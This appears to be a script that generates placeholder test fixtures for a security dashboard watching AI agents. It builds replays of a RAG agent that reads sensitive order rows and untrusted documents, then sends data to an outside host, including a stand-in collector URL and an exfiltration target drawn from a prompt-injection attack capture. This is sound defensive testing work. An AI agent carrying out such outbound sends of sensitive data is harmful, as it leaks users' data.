// ---- (b) data-rich capture: benign bulk wrapped around the real T1 aim-ab runA turn ---------------
const SKUS = ['desk-lamp', 'notebook-a5', 'usb-c-cable', 'monitor-arm', 'chair-mat', 'pen-set', 'webcam', 'headset'];
const STATUSES = ['shipped', 'processing', 'delivered', 'backordered'];

export function orderRows(n = DATA_RICH_ROWS) {
  return Array.from({ length: n }, (_, i) => ({
    order_id: `ORD-${String(100000 + i)}`,
    customer: `customer-${String(i % 97).padStart(3, '0')}`,
    sku: SKUS[i % SKUS.length],
    qty: 1 + (i % 5),
    unit_price_usd: Number((4.5 + (i % 40) * 1.25).toFixed(2)),
    status: STATUSES[i % STATUSES.length],
    placed: `2026-09-${String(1 + (i % 28)).padStart(2, '0')}`,
  }));
}

export function policyDocument() {
  const lines = ['# Company travel policy', ''];
  const topics = ['Booking', 'Approvals', 'Per-diem', 'Lodging', 'Ground transport', 'Receipts', 'Reimbursement', 'Insurance'];
  for (let s = 0; s < 40; s++) {
    lines.push(`## Section ${s + 1}: ${topics[s % topics.length]}`);
    lines.push(`Employees book ${topics[s % topics.length].toLowerCase()} through the approved portal and keep itemized receipts for ${30 + s} days.`);
    lines.push('Managers review requests within two business days; exceptions are recorded in the expense system.');
    lines.push('');
  }
  return lines.join('\n');
}

async function dataRichCapture(aimAb, warnings) {
  const run = aimAb.runA;
  const realCall = run.toolCalls[0];
  const benignReq = await readJson(path.join(CAPTURES, 'benign', '7005_ragbot.req.json'));
  const userTurn = benignReq.messages ?? benignReq.body?.messages;
  const doc = policyDocument();
  const rows = orderRows();
  const dest = stripQuery(run.dvaa.exfilTargetUrl);

  const capture = {
    placeholder: true,
    placeholderNote: 'Data-rich PLACEHOLDER: the real T1 aim-ab runA tool call + dvaa{} ground truth, wrapped in benign bulk (600 ordinary order rows, a >8 KB plain travel-policy document). Alert built through T4 buildAlert; not detector output.',
    title: `Data-rich replay · ${DATA_RICH_ROWS}-row order table + ${(Buffer.byteLength(doc) / 1024).toFixed(1)} KB doc around aim-ab runA`,
    scenario: 'aim-ab',
    expectedLabel: 'attack',
    role: 'vulnerable',
    agent: { name: 'RAGBot', port: 7005 },
    payload: aimAb.payload,
    canary: aimAb.canary,
    exchanges: [
      {
        request: { messages: userTurn },
        response: {
          choices: [{
            message: {
              role: 'assistant', content: '',
              tool_calls: [
                { id: 'call_orders', type: 'function', function: { name: 'query_orders', arguments: JSON.stringify({ limit: DATA_RICH_ROWS }) } },
                { id: 'call_policy', type: 'function', function: { name: 'fetch_document', arguments: JSON.stringify({ path: 'kb/travel-policy.md' }) } },
              ],
            },
            finish_reason: 'tool_calls',
          }],
        },
      },
      {
        // Verbatim T1 runA turn (message, tool call, dvaa{} ground truth).
        request: { messages: [] },
        response: { choices: [{ message: { role: 'assistant', content: run.message, tool_calls: [realCall] }, finish_reason: run.finishReason }] },
        dvaa: run.dvaa,
      },
    ],
    toolResults: [
      { toolCallId: 'call_orders', name: 'query_orders', source: 'db:orders', trust: 'sensitive', rows },
      { toolCallId: 'call_policy', name: 'fetch_document', source: 'kb/travel-policy.md', trust: 'untrusted', content: doc },
    ],
  };
  capture.alerts = [alertFrom({
    alertId: 'placeholder-data-rich-1',
    category: 'taint_flow_exfil',
    ruleId: 'taint.untrusted_read_to_external_send',
    disposition: 'block',
    detectionLatencyMs: 4.6,
    entities: {
      agent: { name: 'RAGBot', id: 'dvaa-ragbot', port: 7005 },
      session: { id: 'data-rich-1' },
      toolCall: { id: realCall.id, name: realCall.function.name, argsPreview: JSON.stringify({ url: dest }) },
      sink: { type: 'http', destination: dest },
    },
    taintPath: [
      { kind: 'source', label: 'kb/travel-policy.md (untrusted)', toolCallId: 'call_policy', trust: 'untrusted' },
      { kind: 'propagate', label: `db:orders (${DATA_RICH_ROWS} rows)`, toolCallId: 'call_orders', trust: 'sensitive' },
      { kind: 'sink', label: `${realCall.function.name} → ${hostOf(dest)}`, toolCallId: realCall.id, trust: 'external' },
    ],
    evidence: `outbound call after a ${DATA_RICH_ROWS}-row read in the same turn`,
  }, warnings)];
  return capture;
}

// ---- (c) long taint path: step_1 … step_200 through buildAlert -> truncation marker ---------------
function longPathCapture(warnings) {
  const n = LONG_PATH_HOPS;
  const sinkUrl = 'https://collector.example.test/in'; // same placeholder host T4's own example uses
  const calls = Array.from({ length: n }, (_, i) => ({
    id: `step_${i + 1}`, type: 'function',
    function: { name: `step_${i + 1}`, arguments: JSON.stringify(i === n - 1 ? { url: sinkUrl } : { n: i + 1 }) },
  }));
  const capture = {
    placeholder: true,
    placeholderNote: `Long-path PLACEHOLDER: ${n} neutral tool hops (step_1 … step_${n}). T4 caps TaintPath at ${T4_BOUNDS.MAX_TAINT_HOPS} hops and inserts a truncation marker; the dashboard must render that marker as a node.`,
    title: `Long taint path · ${n} hops (T4 truncation marker)`,
    scenario: 'long-path',
    expectedLabel: 'attack',
    role: 'single',
    agent: { name: 'ChainBot', port: null },
    exchanges: [{
      request: { messages: [{ role: 'user', content: 'Run the nightly data pipeline.' }] },
      response: { choices: [{ message: { role: 'assistant', content: `running ${n} pipeline steps`, tool_calls: calls }, finish_reason: 'tool_calls' }] },
    }],
    toolResults: calls.slice(0, -1).map((c, i) => ({
      toolCallId: c.id, name: c.function.name, source: `pipeline:${c.id}`, trust: i === 0 ? 'untrusted' : 'internal',
      content: JSON.stringify({ ok: true, step: i + 1 }),
    })),
  };
  capture.alerts = [alertFrom({
    alertId: 'placeholder-long-path-1',
    category: 'taint_flow_exfil',
    ruleId: 'taint.untrusted_read_to_external_send',
    disposition: 'report',
    detectionLatencyMs: 6.3,
    entities: {
      agent: { name: 'ChainBot', id: 'placeholder-chainbot' },
      session: { id: 'long-path-1' },
      toolCall: { id: `step_${n}`, name: `step_${n}`, argsPreview: JSON.stringify({ url: sinkUrl }) },
      sink: { type: 'http', destination: sinkUrl },
    },
    taintPath: calls.map((c, i) => ({
      kind: i === 0 ? 'source' : i === n - 1 ? 'sink' : 'propagate',
      label: c.function.name, toolCallId: c.id, trust: i === 0 ? 'untrusted' : i === n - 1 ? 'external' : 'internal',
    })),
  }, warnings)];
  return capture;
}

// ---- driver ---------------------------------------------------------------------------------------
export async function generate() {
  const warnings = [];
  const aimAb = await readJson(path.join(CAPTURES, 'attack', 'aim-ab.demo.json'));
  const repo = await readJson(path.join(CAPTURES, 'attack', 'repo.demo.json'));
  const flight = await readJson(path.join(CAPTURES, 'attack', 'flight.demo.json'));
  const files = {
    'alerts/attack__aim-ab.demo.alerts.json': aimAbSidecar(aimAb, warnings),
    'alerts/attack__repo.demo.alerts.json': repoSidecar(repo, warnings),
    'alerts/attack__flight.demo.alerts.json': flightSidecar(flight, warnings),
    'captures/data-rich-orders.json': await dataRichCapture(aimAb, warnings),
    'captures/long-taint-path.json': longPathCapture(warnings),
  };
  return { files, warnings };
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  const check = process.argv.includes('--check');
  const { files, warnings } = await generate();
  // Expected: exactly one T4 TaintPath truncation warning (the long-path fixture). Print it loudly.
  for (const w of warnings) console.error(`[make-placeholders] T4 warning: ${w.msg}`);
  let stale = 0;
  for (const [rel, obj] of Object.entries(files)) {
    const file = path.join(HERE, rel);
    const text = `${JSON.stringify(obj, null, 2)}\n`;
    if (check) {
      const cur = await readFile(file, 'utf8').catch(() => null);
      if (cur !== text) {
        stale++;
        console.error(`stale: ${rel}`);
      }
    } else {
      await mkdir(path.dirname(file), { recursive: true });
      await writeFile(file, text);
      console.log(`wrote ${rel} (${Buffer.byteLength(text).toLocaleString('en-US')} B)`);
    }
  }
  if (stale) process.exit(1);
}
